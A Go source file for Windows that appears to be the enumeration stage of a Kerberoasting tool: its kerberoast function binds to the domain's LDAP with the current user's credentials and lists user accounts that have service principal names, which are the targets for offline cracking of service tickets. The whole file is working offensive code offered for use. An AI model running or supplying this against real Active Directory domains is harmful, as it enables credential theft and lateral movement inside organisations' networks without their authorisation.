package main

//go:generate go run $GOROOT/src/syscall/mksyscall_windows.go -output syscallwin.go main.go

import (
	_ "embed"
	"fmt"
	"log"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

//sys ldap_initW(hostName string, portNumber uint64) (ld uintptr,err error) = Wldap32.ldap_initA
//sys ldap_bind_sW(ld uintptr, dn *uint8, cred *uint8, method uint64) (ret uint64) = Wldap32.ldap_bind_sA
//sys ldap_search_sA(ld uintptr, base *uint8, scope uint64, filter *uint8,  attrs **uint8, attrsonly uint64, res *uintptr) (ret uint64) = Wldap32.ldap_search_sA
//sys ldap_count_entries(ld uintptr, res uintptr) (ret uint64) = Wldap32.ldap_count_entries
//sys ldap_get_valuesA(ld uintptr, entry uintptr, attr *uint8) (ret **uint8) = Wldap32.ldap_get_valuesA
//sys ldap_first_entry(ld uintptr, res uintptr) (ret uintptr) = Wldap32.ldap_first_entry
//sys ldap_next_entry(ld uintptr, res uintptr) (ret uintptr) = Wldap32.ldap_next_entry
//sys ldap_value_free(vals **uint8) (ret uint64) = Wldap32.ldap_value_free
//sys ldap_unbind_s(ld uintptr) (ret uint64) = Wldap32.ldap_unbind_s

//sys GetComputerNameExA(nametype uint32, buf unsafe.Pointer, n *uint32) (err error) = Kernel32.GetComputerNameExA

//http://www.wisdomsoft.jp/421.html
//https://qiita.com/t-yama-3/items/724f5f76356b814b0b2d
type (
	DWORD   uint32
	DWORD64 uint64
	LPVOID  uintptr
	LPDWORD *uint32
	LPCSTR  *int8
	LPCWSTR *int16
	LPSTR   *int16
	HANDLE  uintptr
	BYTE    byte
	ULONG   uint64
	PSTR    *uint8
	PZPSTR  **uint8
	PCHAR   *uint8
	CHAR    uint8
)

const (
	LDAP_PORT           uint64 = 389
	LDAP_AUTH_OTHERKIND uint64 = 0x86
	LDAP_AUTH_NEGOTIATE uint64 = (LDAP_AUTH_OTHERKIND | 0x0400)
	LDAP_SUCCESS        uint64 = 0
	LDAP_SCOPE_BASE     uint64 = 0x00
	LDAP_SCOPE_ONELEVEL uint64 = 0x01
	LDAP_SCOPE_SUBTREE  uint64 = 0x02
)

type User struct {
	sAMAccountName       string
	distinguishedName    string
	servicePrincipalName string
}

//Max 1000byte /without error handling
func ldap_get_values(ld uintptr, entry uintptr, attr string) string {
	attrPtr, _ := syscall.BytePtrFromString(attr)
	val := ldap_get_valuesA(ld, entry, attrPtr)
	var resByte []byte
	for i := 0; i < 1000; i++ {
		tmp := (*uint8)(unsafe.Add(unsafe.Pointer(*val), i))
		if *tmp == 0 {
			break
		}
		resByte = append(resByte, *tmp)
	}
	ldap_value_free(val)
	return string(resByte)
}

func kerberoast() {
	var nameType uint32 = windows.ComputerNameDnsDomain
	var bufSize uint32 = 0

	GetComputerNameExA(nameType, nil, &bufSize)
	hostNameByte := make([]uint8, bufSize)
	GetComputerNameExA(nameType, unsafe.Pointer(&hostNameByte[0]), &bufSize)
	hostName := string(hostNameByte[:len(hostNameByte)-1])
	fmt.Println(hostName)

	ld, _ := ldap_initW(hostName, LDAP_PORT)
	iRtn := ldap_bind_sW(ld, nil, nil, LDAP_AUTH_NEGOTIATE)
	if iRtn != LDAP_SUCCESS {
		fmt.Println(iRtn)
		log.Fatalln("Bind error")
	}
	var res uintptr

	ldapStatus := ldap_search_sA(ld, nil, LDAP_SCOPE_BASE, nil, nil, 0, &res)
	if ldapStatus != LDAP_SUCCESS {
		log.Fatalln("ldap_search_sA error")
	}

	numEntries := ldap_count_entries(ld, res)
	fmt.Printf("entries found: %d\n", numEntries)
	domainDN := ldap_get_values(ld, res, "defaultNamingContext")
	base, err := syscall.BytePtrFromString(domainDN)
	if err != nil {
		return
	}
	filter, err := syscall.BytePtrFromString("(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt))")
	if err != nil {
		return
	}

	ldapStatus = ldap_search_sA(ld, base, LDAP_SCOPE_SUBTREE, filter, nil, 0, &res)
	if ldapStatus != LDAP_SUCCESS {
		log.Fatalln("ldap_search_sA error")
	}

	numEntries = ldap_count_entries(ld, res)
	fmt.Printf("entries found: %d\n", numEntries)

	entry := ldap_first_entry(ld, res)

	var users []User
	for i := 0; i < int(numEntries); i++ {
		samAccountName := ldap_get_values(ld, entry, "samAccountName")
		distinguishedName := ldap_get_values(ld, entry, "distinguishedName")
		servicePrincipalName := ldap_get_values(ld, entry, "servicePrincipalName")
		users = append(users, User{sAMAccountName: samAccountName, distinguishedName: distinguishedName, servicePrincipalName: servicePrincipalName})
		entry = ldap_next_entry(ld, res)
	}

	fmt.Println(users)
	ldap_unbind_s(ld)
}

func main() {
	kerberoast()
	// usage := `Usage: usage`
	// if len(os.Args) < 2 {
	// 	fmt.Println(usage)
	// } else if os.Args[1] == "/do" {
	// 	kerberoast()
	// } else {
	// 	return
	// }
}
